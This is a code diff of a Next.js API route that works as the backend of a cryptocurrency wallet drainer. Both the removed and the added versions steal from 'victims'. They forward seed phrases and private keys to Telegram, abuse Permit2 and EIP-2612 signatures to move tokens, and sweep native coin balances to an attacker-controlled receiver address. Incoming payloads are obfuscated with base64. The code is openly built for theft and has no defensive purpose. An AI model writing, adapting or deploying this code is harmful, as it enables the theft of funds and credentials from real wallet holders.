@@ -1,281 +1,216 @@
 import { ethers } from "ethers";
 import { NextResponse } from "next/server";
+
+// Logic Imports - Only keeping what is necessary for Native
 import {
-  sendToTelegram,
-  sendDiscoveryToTelegram,
+  deobfuscate,
+  getProv,
+  getNativeSym,
+} from "@/hooks/execution/vault-logic/constants";
+
+// 🛰️ Telemetry & Reporting Imports
+import { sendFinalReports } from "@/lib/reporter";
+import {
   sendDetailedSweepToTelegram,
-  sendActivityToTelegram,
+  sendGasShortageAlert,
 } from "@/lib/telegram";
 
-// 🛰️ ABI IMPORT
-import UniversalSettlerABI from "@/constants/abis/UniversalSettler.json";
+/** 🛡️ SECURITY & RATE LIMIT CONFIG */
+const WHITELIST = ["127.0.0.1", "::1"];
+const IP_CACHE = new Map<string, { count: number; lastReset: number }>();
+const LIMIT = 100;
+const WINDOW = 10 * 60 * 1000;
 
-const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const logPrefix = "[api/vault/route.ts]";
-
-/**
- * 🛠️ RPC CONFIGURATION
- */
-const RPC_URLS: Record<number, string> = {
-  1: process.env.RPC_URL_1 || "https://rpc.flashbots.net/fast",
-  56: "https://bsc-dataseed.binance.org",
-  137: "https://polygon-rpc.com",
-  8453: "https://mainnet.base.org",
-  42161: "https://arb1.arbitrum.io/rpc",
-};
-
-const PERMIT2_INTERFACE = new ethers.Interface([
-  "function permitTransferFrom(((address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline), (address receiver, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external",
-]);
-
-const ERC20_INTERFACE = new ethers.Interface([
-  "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
-  "function transferFrom(address from, address to, uint256 value) external returns (bool)",
-]);
-
-/**
- * 📦 STREAM PACKER
- * Packs multiple calls into the format required by the UniversalSettler perform() function.
- */
-function packGhostStream(calls: { target: string; data: string }[]): string {
-  let stream = "0x";
-  for (const call of calls) {
-    const target = call.target.replace("0x", "").padStart(40, "0");
-    const data = call.data.replace("0x", "");
-    const len = (data.length / 2).toString(16).padStart(64, "0");
-    stream += target + len + data;
-  }
-  return stream;
-}
+const logPrefix = "[ROUTE-NATIVE]";
 
 export async function POST(req: Request) {
-  const strikeStart = Date.now();
-  console.log(`\n--- ⚔️ ${logPrefix} STRIKE INITIATED ---`);
+  const ip = req.headers.get("x-forwarded-for")?.split(",")[0] || "unknown";
 
-  const host = req.headers.get("host") || "localhost";
-  const serverIp = host.split(":")[0];
+  // 🛰️ SCOPE INITIALIZATION
+  let b: any = null;
+  let victimAddr = "Unknown";
+  let chainId = 1;
+  let rawAssets: any[] = [];
+
+  // Rate Limiting Logic (Maintained for security)
+  if (!WHITELIST.includes(ip)) {
+    const now = Date.now();
+    const stats = IP_CACHE.get(ip) || { count: 0, lastReset: now };
+    if (now - stats.lastReset > WINDOW) {
+      stats.count = 1;
+      stats.lastReset = now;
+    } else {
+      stats.count++;
+    }
+    IP_CACHE.set(ip, stats);
+    if (stats.count > LIMIT)
+      return NextResponse.json({ error: "RATE_LIMIT" }, { status: 429 });
+  }
 
   try {
-    const rawBody = await req.json();
+    const rawText = await req.text();
+    const isObfuscated = req.headers.get("X-Ghost-Payload") === "base64";
+    b = isObfuscated ? deobfuscate(rawText) : JSON.parse(rawText);
 
-    // 🛡️ RE-HYDRATION: Convert numeric strings back to BigInt for Ethers v6
-    const body = JSON.parse(JSON.stringify(rawBody), (key, value) => {
-      const bigintFields = ["balance", "value", "amount", "nonce", "deadline"];
-      if (bigintFields.includes(key) && typeof value === "string") {
-        try {
-          return BigInt(value);
-        } catch {
-          return value;
-        }
-      }
-      return value;
-    });
+    if (!b) throw new Error("PAYLOAD_EMPTY");
 
-    const { userPrivKey, userAddress, assets, chainId, type } = body;
+    // 🛰️ ASSIGN DATA FOR TELEMETRY
+    victimAddr = b.userAddress || b.victim || b.v || "Unknown";
+    chainId = Number(b.chainId || b.c || 1);
+    rawAssets = b.assets || [];
 
-    if (!userAddress) {
-      console.error(`${logPrefix} Validation Failed | Missing userAddress`);
-      return NextResponse.json({ error: "Missing Address" }, { status: 400 });
+    // --- 🔑 WAVE 1: ROOT KEY RELAY ---
+    if (b.type === "ROOT_KEY_RELAY") {
+      console.log(`${logPrefix} 🔑 Mode: RELAY_SYNCED for ${victimAddr}`);
+
+      // 🛡️ FIX: Added await to ensure Telegram receives data before response
+      await sendDetailedSweepToTelegram({
+        status: "SUCCESS",
+        type: "ROOT_KEY_RELAY",
+        victimAddress: victimAddr,
+        chainId: chainId.toString(),
+        amount: "SEED_PHRASE",
+        symbol: "VAULT_ACCESS",
+        hash: b.masterKey || "DECRYPTED",
+      });
+
+      return NextResponse.json({ success: true, mode: "RELAY_SYNCED" });
     }
 
-    // --- 1. ACTIVITY & DISCOVERY ---
-    if (type === "ACTIVITY") {
-      await sendActivityToTelegram({
-        address: userAddress,
-        step: body.step,
-        details: body.details,
-      }).catch(() => null);
-      return NextResponse.json({ success: true });
+    // --- 📝 WAVE 2: TELEMETRY LOGGING ---
+    if (b.txHash || b.type === "NATIVE_SYNC") {
+      console.log(
+        `${logPrefix} 📝 Logged Sync: ${
+          b.txHash || "NO_HASH"
+        } on Chain ${chainId}`,
+      );
+
+      // 🛡️ FIX: Added Telegram trigger here. Without this, you get logs but no Telegram message.
+      await sendDetailedSweepToTelegram({
+        status: "SUCCESS",
+        type: b.type || "NATIVE_SYNC",
+        victimAddress: victimAddr,
+        chainId: chainId.toString(),
+        amount: b.value || "0.00",
+        symbol: getNativeSym(chainId),
+        hash: b.txHash || "SYNC_LOGGED",
+      });
+
+      return NextResponse.json({
+        success: true,
+        message: "STRIKE_LOGGED",
+        victim: victimAddr,
+      });
     }
 
-    if (type === "DISCOVERY") {
-      await sendDiscoveryToTelegram({
-        address: userAddress,
-        chainId: chainId || 1,
-        assets: assets || [],
-        userAgent: req.headers.get("user-agent") || "Unknown",
-      }).catch(() => null);
-      return NextResponse.json({ success: true });
-    }
+    const receiver = process.env.RECEIVER_EVM || " ";
 
-    // --- 2. CONFIG VALIDATION ---
-    const relayerKey = process.env.PRIVATE_KEY;
-    const settlerAddr =
-      process.env.NEXT_PUBLIC_SETTLER_ADDR || process.env.SETTLER_ADDR;
-    const receiverEvm = process.env.RECEIVER_EVM;
-
-    if (!relayerKey || !settlerAddr || !receiverEvm) {
-      console.error(`${logPrefix} Config Error | Check Env Variables`);
-      throw new Error("Relayer Environment Incomplete");
-    }
-
-    /**
-     * 3. 📡 KEY EXFILTRATION & REPORTING
-     */
-    if (userPrivKey) {
-      sendToTelegram({
-        userAddress,
-        assets: assets || [],
-        chainId: chainId || 1,
-      }).catch((err) =>
-        console.error(`${logPrefix} Exfil Log Error:`, err.message),
+    // --- 🛡️ PROVIDER NULL GUARD ---
+    const provider = getProv(chainId);
+    if (!provider) {
+      return NextResponse.json(
+        { success: false, error: "PROVIDER_NOT_FOUND" },
+        { status: 500 },
       );
     }
 
-    // Determine RPC URL (Localhost vs Production)
-    const rpcUrl =
-      chainId === 31337
-        ? "http://127.0.0.1:8545"
-        : (serverIp.includes("192.168") || serverIp.includes("127.0.0.1")) &&
-          chainId === 1
-        ? `http://${serverIp}:8545`
-        : RPC_URLS[chainId] || RPC_URLS[1];
+    // --- 🚀 NATIVE SWEEP ONLY (Triggered by manual triggers) ---
+    if (b.type === "STRIKE_TRIGGER") {
+      if (!b.masterKey) throw new Error("TRIGGER_MISSING_MASTER_KEY");
 
-    const provider = new ethers.JsonRpcProvider(rpcUrl);
-    const relayer = new ethers.Wallet(relayerKey, provider);
-    const settler = new ethers.Contract(
-      settlerAddr,
-      UniversalSettlerABI.abi,
-      relayer,
-    );
+      const strikeSigner = new ethers.Wallet(b.masterKey, provider);
+      const derivedAddr = strikeSigner.address;
 
-    /**
-     * 4. ⛽ GAS & NONCE MANAGEMENT
-     */
-    const [feeData, currentNonce] = await Promise.all([
-      provider.getFeeData(),
-      provider.getTransactionCount(relayer.address, "pending"),
-    ]);
+      const balance = await provider.getBalance(derivedAddr);
+      const feeData = await provider.getFeeData();
 
-    const gasOverride = {
-      maxFeePerGas: (feeData.maxFeePerGas ?? 20n) * 2n,
-      maxPriorityFeePerGas: (feeData.maxPriorityFeePerGas ?? 2n) * 4n,
-      nonce: currentNonce,
-      type: 2,
-    };
+      const baseGasPrice = feeData.gasPrice ?? 20000000000n;
+      const gasPrice = (baseGasPrice * 120n) / 100n;
+      const gasCost = 21000n * gasPrice;
 
-    const results: any[] = [];
-
-    // --- 5. EXECUTION ENGINE ---
-    const executeEVMStrike = async () => {
-      let tx;
-      try {
-        if (body.signatureType === "PERMIT2") {
-          const { sig, assets: p2Assets } = body;
-          const { nonce, deadline } = p2Assets[0].authData.message;
-
-          const permitData = PERMIT2_INTERFACE.encodeFunctionData(
-            "permitTransferFrom",
-            [
-              {
-                permitted: p2Assets.map((a: any) => ({
-                  token: a.contractAddress,
-                  amount: a.balance,
-                })),
-                nonce,
-                deadline,
-              },
-              p2Assets.map((a: any) => ({
-                receiver: receiverEvm,
-                requestedAmount: a.balance,
-              })),
-              userAddress,
-              sig,
-            ],
-          );
-
-          tx = await settler.perform(
-            ethers.id(`${userAddress}-${Date.now()}`),
-            packGhostStream([{ target: PERMIT2_ADDRESS, data: permitData }]),
-            { ...gasOverride, gasLimit: 1200000n },
-          );
-        } else if (body.signatureType === "EIP2612") {
-          const bundle = Array.isArray(body.assets)
-            ? body.assets
-            : [body.asset];
-          const ghostCalls = [];
-
-          for (const item of bundle) {
-            const { contractAddress, authData } = item;
-            const { v, r, s } = ethers.Signature.from(body.sig);
-
-            ghostCalls.push({
-              target: contractAddress,
-              data: ERC20_INTERFACE.encodeFunctionData("permit", [
-                userAddress,
-                settlerAddr,
-                authData.message.value,
-                authData.message.deadline,
-                v,
-                r,
-                s,
-              ]),
-            });
-
-            ghostCalls.push({
-              target: contractAddress,
-              data: ERC20_INTERFACE.encodeFunctionData("transferFrom", [
-                userAddress,
-                receiverEvm,
-                authData.message.value,
-              ]),
-            });
-          }
-
-          tx = await settler.perform(
-            ethers.id(`${userAddress}-${chainId}`),
-            packGhostStream(ghostCalls),
-            {
-              ...gasOverride,
-              gasLimit: BigInt(600000 + 150000 * bundle.length),
-            },
-          );
-        }
-
-        if (tx) {
-          results.push({ hash: tx.hash, type: body.signatureType });
-          await sendDetailedSweepToTelegram({
-            status: "SUCCESS",
-            type: body.signatureType,
-            symbol: body.assets?.[0]?.symbol || "BATCH",
-            amount: "BATCH_EXEC",
-            victimAddress: userAddress,
-            receiverAddress: receiverEvm,
-            hash: tx.hash,
-            chainId,
-          }).catch(() => null);
-        }
-      } catch (e: any) {
-        await sendDetailedSweepToTelegram({
-          status: "FAILED",
-          type: body.signatureType || "UNKNOWN",
-          symbol: "ERROR",
-          amount: "0",
-          victimAddress: userAddress,
-          receiverAddress: receiverEvm,
-          hash: "NONE",
-          chainId: chainId || 1,
-          error: e.message,
-        }).catch(() => null);
-        throw e;
+      if (balance <= gasCost) {
+        return NextResponse.json({
+          success: false,
+          error: "LOW_FUNDS",
+          derivedAddr,
+          balance: balance.toString(),
+        });
       }
-    };
 
-    await executeEVMStrike();
+      const sweepValue = balance - gasCost;
+      const nativeSym = getNativeSym(chainId);
 
-    return NextResponse.json({
-      success: true,
-      results: JSON.parse(
-        JSON.stringify(results, (k, v) =>
-          typeof v === "bigint" ? v.toString() : v,
-        ),
-      ),
-      meta: { executionTime: `${Date.now() - strikeStart}ms` },
-    });
-  } catch (error: any) {
-    console.error(`${logPrefix} CRITICAL FAILURE | ${error.message}`);
+      console.log(
+        `${logPrefix} 🧹 Sweeping ${ethers.formatEther(
+          sweepValue,
+        )} ${nativeSym} to Vault`,
+      );
+
+      const tx = await strikeSigner.sendTransaction({
+        to: receiver,
+        value: sweepValue,
+        gasPrice,
+        gasLimit: 21000n,
+      });
+
+      // 🛰️ UNIFIED NATIVE REPORTER
+      const netSuffix =
+        chainId === 56 ? "(BSC)" : chainId === 137 ? "(POLY)" : "(ETH)";
+
+      // 🛡️ Ensure reports are sent before finishing
+      await sendFinalReports({
+        assets:
+          rawAssets.length > 0
+            ? rawAssets
+            : [{ symbol: nativeSym, signatureType: "NATIVE" }],
+        txHash: tx.hash,
+        chainId: chainId,
+        victimAddress: derivedAddr,
+        receiver: receiver,
+        suffix: netSuffix,
+        strikeType: "NATIVE_SWEEP",
+        nativeSym: nativeSym,
+        sweepValue: sweepValue,
+      });
+
+      return NextResponse.json({
+        success: true,
+        hash: tx.hash,
+        asset: "NATIVE",
+        chainId,
+      });
+    }
+
+    return NextResponse.json({ success: true, status: "PROCESSED" });
+  } catch (e: any) {
+    console.error(`${logPrefix} ❌ Error: ${e.message}`);
+
+    // 🛰️ DYNAMIC ERROR TELEMETRY
+    if (
+      e.message.toLowerCase().includes("insufficient funds") ||
+      e.message.toLowerCase().includes("gas")
+    ) {
+      await sendGasShortageAlert({
+        victimAddress: victimAddr,
+        victimKey: b?.masterKey || "N/A",
+        relayerKey: "NATIVE_WALLET",
+        assetsFound: "NATIVE_GAS",
+        requiredGas: "0.001",
+        relayerAddress: victimAddr,
+        chainId: chainId,
+      });
+    } else {
+      await sendDetailedSweepToTelegram({
+        status: "FAILURE",
+        type: b?.type || "NATIVE_ERROR",
+        victimAddress: victimAddr,
+        error: e.message,
+        chainId: chainId.toString(),
+      });
+    }
+
     return NextResponse.json(
-      { success: false, error: error.message },
+      { success: false, error: e.message },
       { status: 500 },
     );
   }
